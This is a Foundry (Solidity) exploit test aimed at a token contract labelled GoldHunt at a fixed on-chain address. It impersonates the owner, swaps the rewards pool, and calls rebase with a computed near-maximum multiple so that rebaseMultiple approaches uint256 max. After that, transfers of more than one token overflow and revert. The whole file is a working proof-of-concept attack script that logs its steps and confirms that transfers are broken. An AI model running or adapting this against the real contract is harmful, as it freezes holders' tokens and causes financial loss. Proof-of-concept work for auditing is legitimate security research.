import "forge-std/Test.sol";

interface GoldHunt {
    function owner() external view returns (address);
    function rebaseMultiple() external view returns (uint256);
    function setRewardsPool(address _rewardsPool) external;
    function rebase(uint multiple) external;
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x6D3dd96f97b10fc86A7F8607704BBe9936083b89;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate owner in exploit
        vm.label(TARGET, "GoldHunt");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get current owner
        address owner = GoldHunt(TARGET).owner();
        console.log("Current owner:", owner);

        // Step 2: Impersonate owner
        vm.startPrank(owner);

        // Step 3: Create fresh address for rewardsPool (guaranteed 0 balance)
        address freshRewardsPool = address(999999);
        GoldHunt(TARGET).setRewardsPool(freshRewardsPool);

        // Step 4: Get current rebaseMultiple
        uint256 currentMultiple = GoldHunt(TARGET).rebaseMultiple();
        console.log("Current rebaseMultiple:", currentMultiple);

        // Step 5: Calculate maximum multiple without overflow
        // Use type(uint256).max / currentMultiple to avoid overflow in rebase()
        uint256 maxMultiple = type(uint256).max / currentMultiple;
        console.log("Max multiple (no overflow):", maxMultiple);

        // Step 6: Call rebase with maxMultiple
        GoldHunt(TARGET).rebase(maxMultiple);

        // Step 7: Check new rebaseMultiple
        uint256 newMultiple = GoldHunt(TARGET).rebaseMultiple();
        console.log("New rebaseMultiple:", newMultiple);
        console.log("type(uint256).max:", type(uint256).max);

        // newMultiple should be close to type(uint256).max
        // newMultiple = currentMultiple * maxMultiple
        // = currentMultiple * (type(uint256).max / currentMultiple)
        // ≈ type(uint256).max (might be slightly less due to integer division)

        // Step 8: Verify the attack succeeded
        // With rebaseMultiple close to max, amount * rebaseMultiple overflows for amount > 1
        // Try to transfer 1 token (should work since 1 * rebaseMultiple = rebaseMultiple, no overflow)
        // Try to transfer 2 tokens (should fail since 2 * rebaseMultiple > type(uint256).max)

        vm.stopPrank();

        // Get some tokens to test with
        // First, get tokens from owner to attacker
        vm.startPrank(owner);
        GoldHunt(TARGET).transfer(attacker, 10 * 10**18);  // Transfer 10 tokens
        vm.stopPrank();

        console.log("Attacker balance:", GoldHunt(TARGET).balanceOf(attacker));

        // Try to transfer 2 tokens - should overflow
        vm.expectRevert();
        GoldHunt(TARGET).transfer(address(1), 2 * 10**18);

        console.log("Attack successful: Token transfers fail for amount > 1");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

